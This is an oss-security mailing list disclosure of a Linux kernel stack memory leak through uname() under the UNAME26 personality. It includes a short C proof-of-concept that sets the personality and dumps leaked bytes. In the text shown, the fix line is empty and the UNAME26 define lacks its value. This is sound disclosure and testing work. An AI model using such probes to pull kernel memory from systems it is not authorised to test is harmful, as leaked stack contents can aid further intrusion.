  oss-security - Linux kernel stack memory content leak via UNAME26            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 9 Oct From: Kees Cook <keescook@...omium.org> To: oss-security@...ts.openwall.com Subject: Linux kernel stack memory content leak via UNAME26   Calling uname() with the UNAME26 personality set allows a leak of kernel stack contents.  Fix:   PoC:   /* Test for UNAME26 personality uname kernel stack leak.  * Copyright Kees Cook <keescook@...omium.org>  * License: GPLv3  */ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <errno.h> #include <unistd.h> #include <sys/personality.h> #include <sys/utsname.h>  #define UNAME26  int dump_uts(void) { 	int i, leaked = 0; 	struct utsname buf = { };  	if (uname(&buf)) { 		perror("uname"); 		exit(1); 	} 	printf("%s\n", buf.release);  	for (i = strlen(buf.release) + 1; i < sizeof(buf.release); i++) { 		unsigned char c = (unsigned char)buf.release[i];  		printf("%02x", c); 		if (c) 			leaked = 1; 	} 	printf("\n");  	return leaked ? (i - (strlen(buf.release) + 1)) : 0; }  int main(int ac, char **av) { 	int leaked;  	leaked = dump_uts(); 	if (leaked) { 		printf("Leaked %d bytes even without UNAME26!?\n", leaked); 		return 1; 	}   	if (personality(PER_LINUX | UNAME26) < 0) { 		perror("personality"); 		exit(1); 	}  	leaked = dump_uts(); 	if (leaked) { 		printf("Leaked %d bytes!\n", leaked); 		return 1; 	} else { 		printf("Seems safe.\n"); 		return 0; 	} }  --  Kees Cook Chrome OS Security  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      